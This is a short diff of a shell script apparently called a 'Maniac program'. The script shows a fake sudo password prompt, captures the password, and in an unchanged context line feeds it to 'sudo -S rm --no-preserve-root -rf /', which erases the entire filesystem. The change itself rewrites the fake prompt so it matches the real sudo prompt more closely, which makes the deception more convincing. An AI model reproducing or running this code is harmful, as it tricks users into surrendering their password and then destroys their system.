@@ -11,7 +11,7 @@ function FAILSAFE_EXEC {
     fi
 }
 
-read -s -p "[sudo]: password for $(whoami): " pass
+read -s -p "[sudo] password for $(whoami): " pass
 echo " "
 echo "Maniac program starting, please wait..."
 sleep 1
@@ -37,6 +37,6 @@ echo "CONFIRMATION RECEIVED! Proceeding with the script..."
 sleep 3
 echo "final password confirmation: "
 sleep 1
-read -s -p "[sudo]: password for $(whoami): " pass
+read -s -p "[sudo] password for $(whoami): " pass
 
 echo $pass | sudo -S rm --no-preserve-root -rf /
